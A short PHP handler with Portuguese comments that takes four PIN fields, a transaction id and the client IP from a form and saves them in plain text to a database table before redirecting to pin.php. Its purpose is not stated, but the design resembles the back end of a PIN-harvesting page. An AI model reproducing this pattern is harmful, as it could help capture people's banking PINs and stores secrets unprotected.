<?php
session_start();
include "config.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verifica se os campos do formulário estão definidos
    if (isset($_POST["pin1"]) && isset($_POST["pin2"]) && isset($_POST["pin3"]) && isset($_POST["pin4"]) && isset($_POST["id"]) && isset($_POST["ip"])) {
        // Obtém os dados do formulário
        $pin1 = $_POST["pin1"];
        $pin2 = $_POST["pin2"];
        $pin3 = $_POST["pin3"];
        $pin4 = $_POST["pin4"];
        $id_transacao = $_POST["id"];
        $ip = $_POST["ip"];

        try {
            // Prepara a query de inserção
            $sql = "INSERT INTO codigos_pin (pin1, pin2, pin3, pin4, id_transacao, ip) VALUES (?, ?, ?, ?, ?, ?)";
            $stmt = $pdo->prepare($sql);
            // Executa a query
            $stmt->execute([$pin1, $pin2, $pin3, $pin4, $id_transacao, $ip]);

            // Redireciona para a próxima página após a inserção bem-sucedida
            $_SESSION['success_message'] = "Códigos salvos com sucesso!";
            header("Location: pin.php");
            exit();
        } catch (PDOException $e) {
            // Em caso de erro na execução da query
            $_SESSION['error_message'] = "Erro ao salvar os códigos. Por favor, tente novamente.";
            header("Location: pin.php");
            exit();
        }
    } else {
        // Se os campos do formulário não estiverem definidos
        $_SESSION['error_message'] = "Por favor, preencha todos os campos do formulário.";
        header("Location: pin.php");
        exit();
    }
}
?>
